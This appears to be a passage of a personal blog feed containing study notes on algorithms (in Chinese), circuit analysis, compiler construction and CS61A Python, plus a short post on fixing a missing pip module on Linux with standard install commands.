    <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="1-2-二分查找"><a href="#1-2-二分查找" class="headerlink" title="1.2 二分查找"></a>1.2 二分查找</h2><h3 id="1-2-2-运行时间"><a href="#1-2-2-运行时间" class="headerlink" title="1.2.2 运行时间"></a>1.2.2 运行时间</h3><p>如果最多猜测的次数与列表长度相同,这被称为线性时间(linear time).</p><h2 id="1-3-大O表示法"><a href="#1-3-大O表示法" class="headerlink" title="1.3 大O表示法"></a>1.3 大O表示法</h2><p>大O表示法指出了算法有多快.</p><p>使用大O表示法, 这个运行时间为O(n).</p><p>大O表示法指的并非以秒为单位的速度, 大O表示法让你能够比较操作数,它指出了算法运行时间的增速.</p><p>O(n), 这里的<code>n</code>为操作数, 之所以称为大O表示法, 是因为操作数前有个大O.</p><h3 id="1-3-3-大O表示法指出了最糟情况下的运行时间"><a href="#1-3-3-大O表示法指出了最糟情况下的运行时间" class="headerlink" title="1.3.3 大O表示法指出了最糟情况下的运行时间"></a>1.3.3 大O表示法指出了最糟情况下的运行时间</h3><p>简单查找的运行时间为O(n), 二分查找的运行时间为$\logn$.</p><h3 id="1-3-5-旅行商"><a href="#1-3-5-旅行商" class="headerlink" title="1.3.5 旅行商"></a>1.3.5 旅行商</h3><p>计算机科学领域非常著名的旅行商问题.</p><p>找到最短旅程的方案.</p><h1 id="第2章-选择排序"><a href="#第2章-选择排序" class="headerlink" title="第2章 选择排序"></a>第2章 选择排序</h1><h2 id="2-2-数组和链表"><a href="#2-2-数组和链表" class="headerlink" title="2.2 数组和链表"></a>2.2 数组和链表</h2><p>O(n) 是线性时间.</p><p>O(1) 是常量时间.</p><p>数组在随机读取上更快.</p><p>链表在插入上更快.</p><h3 id="2-2-4-在中间插入"><a href="#2-2-4-在中间插入" class="headerlink" title="2.2.4 在中间插入"></a>2.2.4 在中间插入</h3><h3 id="2-2-5-删除"><a href="#2-2-5-删除" class="headerlink" title="2.2.5 删除"></a>2.2.5 删除</h3><h2 id="2-3-选择排序"><a href="#2-3-选择排序" class="headerlink" title="2.3 选择排序"></a>2.3 选择排序</h2><p>一般 O($\frac{n^2}{2}$) 写为 O($n^2$), 这个$\frac{1}{2}$一般会省略. </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">selectionSort</span>(arr):<br>  newArr = []<br>  for i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arr)):<br>      smallest = <span class="hljs-built_in">findSmallest</span>(arr)<br>      newArr.<span class="hljs-built_in">append</span>(arr.<span class="hljs-built_in">pop</span>(smallest))<br>return newArr<br></code></pre></td></tr></table></figure><p> 看来<code>pop</code>可以弹出任意的元素.</p><h1 id="第3章-递归"><a href="#第3章-递归" class="headerlink" title="第3章 递归"></a>第3章 递归</h1><p>如果使用循环, 程序的性能可能更高; 如果使用递归, 程序可能更容易理解.</p><h2 id="3-2-基线条件和递归条件"><a href="#3-2-基线条件和递归条件" class="headerlink" title="3.2 基线条件和递归条件"></a>3.2 基线条件和递归条件</h2><p>编写递归函数, 必须告诉它何时停止递归. 因此, 每个递归函数都有两部分:</p><ul><li>base case, 基线条件, 指函数不再调用自己</li><li>recursive case, 递归条件, 指函数调用自己</li></ul><h2 id="3-3-栈"><a href="#3-3-栈" class="headerlink" title="3.3 栈"></a>3.3 栈</h2><p>一个重要的编程概念–call stack, 调用栈. 其只有两个操作, push, 压入和pop, 弹出.</p><p>计算机使用一个栈来表示这些内存块.</p><p>一个重要概念: 调用另一个函数时, 当前函数暂停并处于未完成状态, 该函数的所有变量的值都还在内存中.</p><h3 id="3-3-2-递归调用栈"><a href="#3-3-2-递归调用栈" class="headerlink" title="3.3.2 递归调用栈"></a>3.3.2 递归调用栈</h3><p>栈在递归中扮演着重要角色.</p><h1 id="第4章-快速排序"><a href="#第4章-快速排序" class="headerlink" title="第4章 快速排序"></a>第4章 快速排序</h1><p>Divide and Conquer, D&amp;C, 一种递归式问题解决方法.</p><p>D&amp;C 的工作原理:</p><ol><li>找出简单的基线条件</li><li>确定如何缩小问题的规模, 使其符合基线条件<br>D&amp;C 并非可用于解决问题的算法, 而是一种解决问题的思路.</li></ol><p>编写<mark>涉及数组</mark>的递归函数时, 基线条件通常是数组为空或只包含一个元素.</p><p>在很多用循环解决的方案中, 可以考虑使用递归.</p><h2 id="4-2-快速排序"><a href="#4-2-快速排序" class="headerlink" title="4.2 快速排序"></a>4.2 快速排序</h2><p>工作原理:</p><ol><li>从数组中选择一个元素, 这个元素被称为基准值(pivot).</li><li>找出比基准值小的元素以及比基准值大的元素. 这被称为分区(partitioning).</li><li>对这两个子数组进行快速排序.<br>任何元素用作基准值都可行.</li></ol><p><mark>归纳证明</mark>, 一种证明算法行之有效的方式, 分为两步: 基线条件和归纳条件.</p><h2 id="4-3-再谈大O表示法"><a href="#4-3-再谈大O表示法" class="headerlink" title="4.3 再谈大O表示法"></a>4.3 再谈大O表示法</h2><p>快速排序的独特之处在于,其速度取决于选择的基准值.</p><h3 id="4-3-1-比较合并排序和快速排序"><a href="#4-3-1-比较合并排序和快速排序" class="headerlink" title="4.3.1 比较合并排序和快速排序"></a>4.3.1 比较合并排序和快速排序</h3><h3 id="4-3-2-平均情况和最糟情况"><a href="#4-3-2-平均情况和最糟情况" class="headerlink" title="4.3.2 平均情况和最糟情况"></a>4.3.2 平均情况和最糟情况</h3><h1 id="第5章-散列表"><a href="#第5章-散列表" class="headerlink" title="第5章 散列表"></a>第5章 散列表</h1><p>Hashtable, 就是哈希表.</p><h2 id="5-1-散列函数"><a href="#5-1-散列函数" class="headerlink" title="5.1 散列函数"></a>5.1 散列函数</h2><p>对于同样的输入, 散列表必须返回同样的输出.</p><h2 id="5-2-应用案例"><a href="#5-2-应用案例" class="headerlink" title="5.2 应用案例"></a>5.2 应用案例</h2><h3 id="5-2-1-将散列表用于查找"><a href="#5-2-1-将散列表用于查找" class="headerlink" title="5.2.1 将散列表用于查找"></a>5.2.1 将散列表用于查找</h3><p>散列表能够模拟映射关系.</p><h3 id="5-2-2-防止重复"><a href="#5-2-2-防止重复" class="headerlink" title="5,2,2 防止重复"></a>5,2,2 防止重复</h3><h3 id="5-2-3-用作缓存"><a href="#5-2-3-用作缓存" class="headerlink" title="5.2.3 用作缓存"></a>5.2.3 用作缓存</h3><h2 id="5-3-冲突"><a href="#5-3-冲突" class="headerlink" title="5.3 冲突"></a>5.3 冲突</h2><p>要明白散列表的性能, 需了解什么是冲突. Collision: 给两个键分配的位置相同.</p><p>最简单的解决方法: 如果两个键映射到了同一个位置, 就在这个位置存储一个链表.</p><p>最理想的情况是, 散列函数将键均匀地映射到散列表的不同位置.</p><p>如果散列表存储的链表很长, 散列表的速度将急剧下降.</p><h2 id="5-4-性能"><a href="#5-4-性能" class="headerlink" title="5.4 性能"></a>5.4 性能</h2><p>在平均情况下, 无论散列表包含多少个元素, 从中获取数据所需的时间都相同, 为O(1)–常量时间.</p><p>在最糟情况下, 散列表所有操作的运行时间都为O(n)–线性时间.</p><p>为避免冲突, 需要有:</p><ul><li>较低的填装因子</li><li>良好的散列函数</li></ul><h3 id="5-4-1-填装因子"><a href="#5-4-1-填装因子" class="headerlink" title="5.4.1 填装因子"></a>5.4.1 填装因子</h3><p>计算:<br>$\frac{element number}{position number}$</p><p>填装因子大于1意味着商品数量超过了数组的位置数, 一旦填装因子开始增大, 你就需要在散列表中添加位置, 这被称为调整长度(resizing).</p><p>一个经验规则: 一旦填装因子大于0.7, 就调整散列表的长度.</p><h3 id="5-4-2-良好的散列函数"><a href="#5-4-2-良好的散列函数" class="headerlink" title="5.4.2 良好的散列函数"></a>5.4.2 良好的散列函数</h3><p>良好的散列函数让数组中的值呈均匀分布.</p><p>糟糕的散列函数让值扎堆, 导致大量冲突.</p><h1 id="第6章-广度优先搜索"><a href="#第6章-广度优先搜索" class="headerlink" title="第6章 广度优先搜索"></a>第6章 广度优先搜索</h1><p>Breadth-first search, BFS. 用于找出两样东西之间的最短距离.</p>]]></content>
    
    
    <categories>
      
      <category>Algorithms</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Solved: /usr/bin/python3: No module named pip error on Linux</title>
    <link href="/2022/08/01/Solved-usr-bin-python3-No-module-named-pip-error-on-Linux/"/>
    <url>/2022/08/01/Solved-usr-bin-python3-No-module-named-pip-error-on-Linux/</url>
    
    <content type="html"><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><a href="https://stackoverflow.com/questions/44622182/python-3-6-no-module-named-pip">reference1</a></p><p>manually install <code>pip</code>:</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wget</span> <span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-built_in">get-pip.py</span><br><span class="hljs-string">sudo</span> <span class="hljs-string">python3</span> <span class="hljs-built_in">get-pip.py</span><br></code></pre></td></tr></table></figure><p>In Debian distributions:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python</span>-pip ##for python2<br><br>sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">python3</span>-pip ##for <span class="hljs-keyword">python3</span><br></code></pre></td></tr></table></figure><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><a href="https://www.cyberithub.com/solved-usr-bin-python3-no-module-named-pip-error-on-linux/">reference2</a></p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>电路分析导论</title>
    <link href="/2022/08/01/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%AF%BC%E8%AE%BA%20Notes/"/>
    <url>/2022/08/01/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%AF%BC%E8%AE%BA%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-绪论"><a href="#Chapter-1-绪论" class="headerlink" title="Chapter 1 绪论"></a>Chapter 1 绪论</h1><h2 id="1-3-测量单位与单位制"><a href="#1-3-测量单位与单位制" class="headerlink" title="1.3 测量单位与单位制"></a>1.3 测量单位与单位制</h2><p>米最初被定义为沿海平面从地球赤道到地球南极或北极距离的一千万分之一。</p><p>现在的米是参照真空中的光速定义的，光速为299792458m&#x2F;s.</p><p>千克定义为1cm^3纯净水在4oc时质量的1000倍.</p><p>秒最初的定义为平均太阳日的86400分之一.</p><p>1967年, 秒被重新定义为铯原子电磁辐射(能级跃迁)周期的9192631770倍.</p><h1 id="Chapter-2-电压和电流"><a href="#Chapter-2-电压和电流" class="headerlink" title="Chapter 2 电压和电流"></a>Chapter 2 电压和电流</h1><p>每一电子层所存在的最多电子数量可用2n^2来计算.</p><h2 id="2-3-电压"><a href="#2-3-电压" class="headerlink" title="2.3 电压"></a>2.3 电压</h2><p>一般地,每个电压源都是靠分离正电荷和负电荷来建立电压的.</p><p>6.242 x 10^18 个电子所带的总电荷量称为1库仑(C).</p><p>如果在两点之间移动1库仑(C)的负电荷, 刚好消耗了1焦耳(J)的能量, 则这两点之间就有1伏特(V)的电压.</p>]]></content>
    
    
    <categories>
      
      <category>Circuit Analysis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Engineering a compiler Notes</title>
    <link href="/2022/08/01/Engineering-a-compiler-Notes/"/>
    <url>/2022/08/01/Engineering-a-compiler-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Overview-of-Compilation"><a href="#Chapter-1-Overview-of-Compilation" class="headerlink" title="Chapter 1 Overview of Compilation"></a>Chapter 1 Overview of Compilation</h1><p>Compilers are computer programs that translate a program written in one language into a program written in another language.</p><h2 id="1-1-INTRODUCTION"><a href="#1-1-INTRODUCTION" class="headerlink" title="1.1 INTRODUCTION"></a>1.1 INTRODUCTION</h2><p>The compiler has a <mark>front end</mark> to deal with the source language, which focus on understanding the source-language program, and it has a <mark>back end</mark> to deal with the target language, which focus on mapping programs to the target machine.</p><p>Many research compilers produce C program as their output. Because compilers for C are available on most computers.</p><p>Two fundamental principles:<br>    - The compiler must preserve the meaning of the program being compiled.<br>    - The compiler must improve the input program in some discernible way.</p><h2 id="1-2-COMPILER-STRUCTURE"><a href="#1-2-COMPILER-STRUCTURE" class="headerlink" title="1.2 COMPILER STRUCTURE"></a>1.2 COMPILER STRUCTURE</h2><p>A compiler uses some sets of data structures to represent the code it processes. That form is called an <mark>intermediate representation</mark>.</p><p><mark>Two-phase compiler</mark>, 只有 front end 和 back end.<br><mark>Three-phase compiler</mark>, 有 front end, optimizer 和 back end.</p><h2 id="1-3-OVERVIEW-OF-TRANSLATION"><a href="#1-3-OVERVIEW-OF-TRANSLATION" class="headerlink" title="1.3 OVERVIEW OF TRANSLATION"></a>1.3 OVERVIEW OF TRANSLATION</h2><p><mark>Notation</mark><br>A compiler translates a program written in one notation into an equivalent program written in another notation.</p><h3 id="1-3-1-The-Front-End"><a href="#1-3-1-The-Front-End" class="headerlink" title="1.3.1 The Front End"></a>1.3.1 The Front End</h3><h4 id="Cheching-Syntax"><a href="#Cheching-Syntax" class="headerlink" title="Cheching Syntax"></a>Cheching Syntax</h4><p>The source language is a set, usually infinite, of strings defined by some finite set of rules, called a grammar.</p><p>The scanner takes a stream of characters and converts it to a stream of classified words.</p><p>The actual spelling of the words might be stored in a hash table and represented in the pairs with an integer index.</p><p>The process of automatically finding derivations is called <mark>parsing</mark>.</p><h4 id="Intermediate-Representations"><a href="#Intermediate-Representations" class="headerlink" title="Intermediate Representations"></a>Intermediate Representations</h4><p>Compilers use a variety of different kinds of IR.</p><h3 id="1-3-2-The-Optimizer"><a href="#1-3-2-The-Optimizer" class="headerlink" title="1.3.2 The Optimizer"></a>1.3.2 The Optimizer</h3><p>The optimizer analyzes the IR form of the code to discover facts about that context and uses that contextual knowledge to rewrite the code so that it computes the same answer in a more efficient way.</p><h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><h4 id="Transformation"><a href="#Transformation" class="headerlink" title="Transformation"></a>Transformation</h4><h3 id="1-3-3-The-Back-End"><a href="#1-3-3-The-Back-End" class="headerlink" title="1.3.3 The Back End"></a>1.3.3 The Back End</h3><p>The compiler’s back end traverses the IR form of the code and emits code for the target machine.</p><p><code>ILOC</code>–”intermediate language for an optimizing compiler”, is a notation fo low-level examples.</p><h4 id="Instruction-Selection"><a href="#Instruction-Selection" class="headerlink" title="Instruction Selection"></a>Instruction Selection</h4><p>Instruction selection maps each IR operation, in its context, into one or more target machine operations.<br><mark>Virtual register</mark><br>A symbolic register name that the compiler uses to indicate that a value can be stored in a register.</p><p>意思就是选择最合适的 instruction, 所以叫 instruction selector, 比如一个 source code, mapping to 一个 machine code, 有几种选择, 这时 instruction selector 会选择最好的一个. </p><h4 id="Register-Allocation"><a href="#Register-Allocation" class="headerlink" title="Register Allocation"></a>Register Allocation</h4><p>The register allocator must map those virtual registers onto actual target-machine registers.</p><p>The optimization would increase demand for registers but eliminate a later instruction. 意思就是把前面计算的值用于后面的计算.</p><h4 id="Instruction-Scheduling"><a href="#Instruction-Scheduling" class="headerlink" title="Instruction Scheduling"></a>Instruction Scheduling</h4><p>To reorder operation.</p><p>It attempts to minimize the number of cycles wasted waiting for operands.</p><h4 id="Interactions-Among-Code-Generation-Components"><a href="#Interactions-Among-Code-Generation-Components" class="headerlink" title="Interactions Among Code-Generation Components"></a>Interactions Among Code-Generation Components</h4><h2 id="1-4-SUMMARY-AND-PERSPECTIVE"><a href="#1-4-SUMMARY-AND-PERSPECTIVE" class="headerlink" title="1.4 SUMMARY AND PERSPECTIVE"></a>1.4 SUMMARY AND PERSPECTIVE</h2><h1 id="Chapter-2-Scanners"><a href="#Chapter-2-Scanners" class="headerlink" title="Chapter 2 Scanners"></a>Chapter 2 Scanners</h1><p>The scanner is the only pass in the compiler to touch every character in the input program.</p><p>The regular expression, a notation used to describe the valid words in a programming laguage.</p><h2 id="2-1-INTRODUCTION"><a href="#2-1-INTRODUCTION" class="headerlink" title="2.1 INTRODUCTION"></a>2.1 INTRODUCTION</h2><p>The scanner, 也就是 lexical analyzer, reads a stream of characters and produces a stream of words.</p><h3 id="Conceptual-Roadmap"><a href="#Conceptual-Roadmap" class="headerlink" title="Conceptual Roadmap"></a>Conceptual Roadmap</h3><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><mark>Syntactic category</mark>, a classification of words according to their grammatical usage.</p><p><mark>Microsyntax</mark>, the lexical structure of a language, which specifies how to group characters into words and how to separate words that run together.</p><p>In most languages, blanks and punctuation marks terminate a word.</p><p><mark>Keyword</mark>, a word that is reserved for a particular syntactic purpose and, thus, cannot be used as an identifier.</p><p>Both generated and hand-crafted scanners can be implemented to require just O(1) time per character.</p><h2 id="2-2-RECONGNIZING-WORDS"><a href="#2-2-RECONGNIZING-WORDS" class="headerlink" title="2.2 RECONGNIZING WORDS"></a>2.2 RECONGNIZING WORDS</h2><p>The recognizer takes one transition per input character.</p><h3 id="2-2-1-A-Formalism-for-Recognizers"><a href="#2-2-1-A-Formalism-for-Recognizers" class="headerlink" title="2.2.1 A Formalism for Recognizers"></a>2.2.1 A Formalism for Recognizers</h3><p><mark>Finite automation</mark>, a formalism for recogmizers that has a finite set of states, an alphabet, a transition function, a start state, and one or more accepting states. A finite automaton(FA) is a five-tuple($S, \epsilon, \delta, s_0, S_A$).</p><p>有一个 error state $s_e$.</p><h3 id="2-2-2-Recognizing-More-Complex-Words"><a href="#2-2-2-Recognizing-More-Complex-Words" class="headerlink" title="2.2.2 Recognizing More Complex Words"></a>2.2.2 Recognizing More Complex Words</h3><p>Syntactic category 和 lexeme.</p><h2 id="2-3-REGULAR-EXPRESSION"><a href="#2-3-REGULAR-EXPRESSION" class="headerlink" title="2.3 REGULAR EXPRESSION"></a>2.3 REGULAR EXPRESSION</h2><p>The language described by an RE is called a <mark>regular languages</mark>.</p><p>Simple recognizers have simple RE specifications.</p><h3 id="2-3-1-Formalizing-the-Notation"><a href="#2-3-1-Formalizing-the-Notation" class="headerlink" title="2.3.1 Formalizing the Notation"></a>2.3.1 Formalizing the Notation</h3><p>An RE  is built up from three basic operations:</p><ol><li>Alternation, R|S</li><li>Concatenation, RS</li><li>Closure, $R^*$</li></ol><p>Regular expression are used in many applications to specify patterns in character strings.</p><p>Parentheses have highest precedence, followed by closure, concatenation, and alternation, in that order.</p><h3 id="2-3-2-Examples"><a href="#2-3-2-Examples" class="headerlink" title="2.3.2 Examples"></a>2.3.2 Examples</h3><p>The point is critical: the cost of operating an FA is proportional to the length of the input, not to the length or complexity of the RE that generates the FA.</p><h3 id="2-3-3-Closure-Properties-of-REs"><a href="#2-3-3-Closure-Properties-of-REs" class="headerlink" title="2.3.3 Closure Properties of REs"></a>2.3.3 Closure Properties of REs</h3><p>Regular expressions are closed under many operations–that is, if we apply the operation to an RE or a collection of REs, the result is an RE.</p><h2 id="2-4-FROM-REGULAR-EXPRESSION-TO-SCANNER"><a href="#2-4-FROM-REGULAR-EXPRESSION-TO-SCANNER" class="headerlink" title="2.4 FROM REGULAR EXPRESSION TO SCANNER"></a>2.4 FROM REGULAR EXPRESSION TO SCANNER</h2><p>The goal of out work with finite automata is to automate the derivation of executable scanners from a collection of REs.</p><p>Deterministic FAs, or DFAs. Kleene’s construction derives an RE from a DFA.</p><p>Nondeterministic FAs, or NFAs. Thompson’s construction derives an NFA from an RE.</p><h3 id="2-4-1-Nondeterministic-Finite-Automata"><a href="#2-4-1-Nondeterministic-Finite-Automata" class="headerlink" title="2.4.1 Nondeterministic Finite Automata"></a>2.4.1 Nondeterministic Finite Automata</h3><p>An FA that includes states such as $s_0$ that have multiple transitions on a single character is called a <mark>nondeterministic finite automaton</mark>. Its an FA thats allows transitions on the empty string, $\epsilon$, and states that have multiple transitions on the same character.</p><p>An FA with unique character transitions in each state is called a <mark>deterministic finite automaton</mark>. Its an FA where the transition function is single-valued. DFAs do not allow $\epsilon$-transitions.</p><p>NFA 的行为:</p><ul><li>Each time the NFA must make a nondeterministic choice, it follows the transition that leads to an accepting state for the input string, if such a transition exists. 也就是说NFA会把一条路线走完.</li><li>NFA 会 clones itself to pursue each possible transition. At any point, we call the specific set of states in which the NFA is active its <mark>configuration</mark>. 也就是其中某一条.</li></ul><h4 id="Equivalence-of-NFAs-and-DFAs"><a href="#Equivalence-of-NFAs-and-DFAs" class="headerlink" title="Equivalence of NFAs and DFAs"></a>Equivalence of NFAs and DFAs</h4><p>NFAs and DFAs are equivalent in their expressive power. Any DFA is a special case of an NFA.</p><h3 id="2-4-2-Regular-Expression-to-NFA-Thompson’s-Construction"><a href="#2-4-2-Regular-Expression-to-NFA-Thompson’s-Construction" class="headerlink" title="2.4.2 Regular Expression to NFA: Thompson’s Construction"></a>2.4.2 Regular Expression to NFA: Thompson’s Construction</h3><p>Deriving an NFA from the RE.</p><p>因为 NFA 要尝试所有情况, 因此 NFA 需要 $\epsilon$ transformation. 在每一个分支处都需要 $\epsilon$ transformation.</p><p>Each NFA has one start state and one accepting state of NFAs for some component REs.</p><p>An $\epsilon$-transition always connects two states.</p><p>The NFA also contains many $\epsilon$-moves that are obviously unneeded.</p><h3 id="2-4-3-NFA-to-DFA-The-Subset-Construction"><a href="#2-4-3-NFA-to-DFA-The-Subset-Construction" class="headerlink" title="2.4.3 NFA to DFA: The Subset Construction"></a>2.4.3 NFA to DFA: The Subset Construction</h3><p>DFA executions is much easier to simulate than NFA.</p><p>The algorithm that constructs a DFA from an NFA is called <mark>subset construction</mark>.</p><p><mark>Valid configuration</mark>, configuration of an NFA that can be reached by some input string.</p><h3 id="2-4-5-Using-a-DFA-as-a-Recognizer"><a href="#2-4-5-Using-a-DFA-as-a-Recognizer" class="headerlink" title="2.4.5 Using a DFA as a Recognizer"></a>2.4.5 Using a DFA as a Recognizer</h3><h2 id="2-5-IMPLEMENTING-SCANNERS"><a href="#2-5-IMPLEMENTING-SCANNERS" class="headerlink" title="2.5 IMPLEMENTING SCANNERS"></a>2.5 IMPLEMENTING SCANNERS</h2><p>最后一部似乎是 convert the DFA into executable code.</p><p>Three implementation strategies for converting a DFA into executable code:</p><ul><li>a table-driven scanner</li><li>a direct-coded scanner</li><li>a hand-coded sanner<br>All of these scanners operate in the same manner, by simulating the DFA.<br>The three implementation strategies differ in the details of their runtime cost.</li></ul><h3 id="2-5-1-Table-Driven-Scanners"><a href="#2-5-1-Table-Driven-Scanners" class="headerlink" title="2.5.1 Table-Driven Scanners"></a>2.5.1 Table-Driven Scanners</h3>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS61A Python Notes</title>
    <link href="/2022/07/31/CS61A-Python-Notes/"/>
    <url>/2022/07/31/CS61A-Python-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="textbook">http://composingprograms.com/pages/13-defining-new-functions.html</a></p><h1 id="Chapter-1-Building-Abstractions-with-Functions"><a href="#Chapter-1-Building-Abstractions-with-Functions" class="headerlink" title="Chapter 1: Building Abstractions with Functions"></a>Chapter 1: Building Abstractions with Functions</h1><h2 id="1-1-Getting-Started"><a href="#1-1-Getting-Started" class="headerlink" title="1.1 Getting Started"></a>1.1 Getting Started</h2><h3 id="1-1-4-First-Example"><a href="#1-1-4-First-Example" class="headerlink" title="1.1.4 First Example"></a>1.1.4 First Example</h3><p><mark>Statement</mark> describe actions. statement are not evaluated but executed.</p><p><mark>Expression</mark> describe computations.<br>All expressions can use function call notation.</p><h2 id="1-2-Elements-of-Programming"><a href="#1-2-Elements-of-Programming" class="headerlink" title="1.2 Elements of Programming"></a>1.2 Elements of Programming</h2><p>Data is stuff that we want to manipulate, and functions describe the rules for manipulating the data.</p><h3 id="1-2-3-Importing-Library-Functions"><a href="#1-2-3-Importing-Library-Functions" class="headerlink" title="1.2.3 Importing Library Functions"></a>1.2.3 Importing Library Functions</h3><p>Import from the <code>math</code> module:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt </span><br></code></pre></td></tr></table></figure><p>The interpreter must maintain some sort of memory that keeps track of the names, values, and bindings. This memory called a <mark>environment</mark>.</p><p>We can use assignment statements to give new names to existing functions.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">f</span> <span class="hljs-operator">=</span> max<br></code></pre></td></tr></table></figure><p>Assining multiple values to multiple names in a single statement:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">area</span>, circumference = <span class="hljs-literal">pi</span> * radius * radius, <span class="hljs-number">2</span> * <span class="hljs-literal">pi</span> * radius<br></code></pre></td></tr></table></figure><h3 id="1-2-5-Evaluating-Nested-Expressions"><a href="#1-2-5-Evaluating-Nested-Expressions" class="headerlink" title="1.2.5 Evaluating Nested Expressions"></a>1.2.5 Evaluating Nested Expressions</h3><p>To evaluate a call expression, Python will do the following:<br>    1. Evaluate the operator and operand subexpressions, then<br>    2. Apply the function that is the value of the operator subexpression to the arguments that are the values of the operand subexpressions.</p><h3 id="1-2-6-The-Non-Pure-Print-Function"><a href="#1-2-6-The-Non-Pure-Print-Function" class="headerlink" title="1.2.6 The Non-Pure Print Function"></a>1.2.6 The Non-Pure Print Function</h3><p>Distinguish between two types of functions:</p><p><mark>Pure functions</mark>: Functions have some input(their arguments) and reutrn some output(the result of applying them).</p><p><mark>Non-pure functions</mark>: make some change to the state of the interpreter or computer, a common side effect is to generate additional output beyond the return value.</p><p><code>None</code> is a special Python value that represents nothing.</p><p>Be careful with <code>print</code>. The fact that it returns <code>None</code> means that it should not be the expression in an assignment statement.</p><h2 id="1-3-Defining-New-Functions"><a href="#1-3-Defining-New-Functions" class="headerlink" title="1.3 Defining New Functions"></a>1.3 Defining New Functions</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; def square(<span class="hljs-keyword">x</span>):<br>        return <span class="hljs-keyword">mul</span>(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span>)<br></code></pre></td></tr></table></figure><p>The <code>x</code> in this definitions is called a “formal parameter”</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def &lt;name&gt;(&lt;formal parameters&gt;):<br>    <span class="hljs-keyword">return</span> &lt;<span class="hljs-keyword">return</span> expression&gt;<br></code></pre></td></tr></table></figure><h3 id="1-3-1-Environments"><a href="#1-3-1-Environments" class="headerlink" title="1.3.1 Environments"></a>1.3.1 Environments</h3><p>An <mark>environments</mark> in which an expression is evaluated consists of a sequence of frames.</p><p>Each <mark>frame</mark> contains bindings, each of which associates a name with its corresponding value.<br>There is a global environment.</p><p>The name appearing in the function is called the <code>intrinsic name</code>.<br>The name in a frame is a <code>bound name</code>.<br>Different names may refer to the same function, but that function itself has only one intrinsic name.</p><p>A description of the formal parameters of a function is called the <mark>function’s signature</mark>.</p><h3 id="1-3-2-Calling-User-Defined-Functions"><a href="#1-3-2-Calling-User-Defined-Functions" class="headerlink" title="1.3.2 Calling User-Defined Functions"></a>1.3.2 Calling User-Defined Functions</h3><p>Applying a user-defined function introduces a second <mark>local frame</mark>, which is only accessible to that function.</p><p><mark>Name Evaluation</mark>. A name evaluates to the value bound to that name in the earliest frame of the current environment in which that name is found.</p><p>Names are bound to values, which are distributed across many independent local frames, along with a single global frame that contains shared names. A new local frame is introduced every time a function is called.</p><h3 id="1-3-4-Local-Names"><a href="#1-3-4-Local-Names" class="headerlink" title="1.3.4 Local Names"></a>1.3.4 Local Names</h3><h3 id="1-3-5-Choosing-Names"><a href="#1-3-5-Choosing-Names" class="headerlink" title="1.3.5 Choosing Names"></a>1.3.5 Choosing Names</h3><h3 id="1-3-6-Functions-as-Abstractions"><a href="#1-3-6-Functions-as-Abstractions" class="headerlink" title="1.3.6 Functions as Abstractions"></a>1.3.6 Functions as Abstractions</h3><p>The three core attributes of a function: The <mark>domain</mark> of a function is the set of arguments it can take. The <mark>range</mark> of a function is the set of value it can return. The <mark>indent</mark> of a function is the relationship it computes between inputs and output.</p><h3 id="1-3-7-Operators"><a href="#1-3-7-Operators" class="headerlink" title="1.3.7 Operators"></a>1.3.7 Operators</h3><p>The <code>//</code> operator, rounds the result down to an integer.</p><p>The operator can be seen as shorthand for function, like: <code>+</code> is the shorthand of <code>add()</code>.</p><h2 id="1-4-Designing-Function"><a href="#1-4-Designing-Function" class="headerlink" title="1.4 Designing Function"></a>1.4 Designing Function</h2><p>The qualities of good functions all reinforce the idea that functions are abstractions.<br>    - Each function should have exactly one job<br>    - Don’t repeat yourself is a central tenet of software engineering<br>    - Functions should be defined generally</p><h3 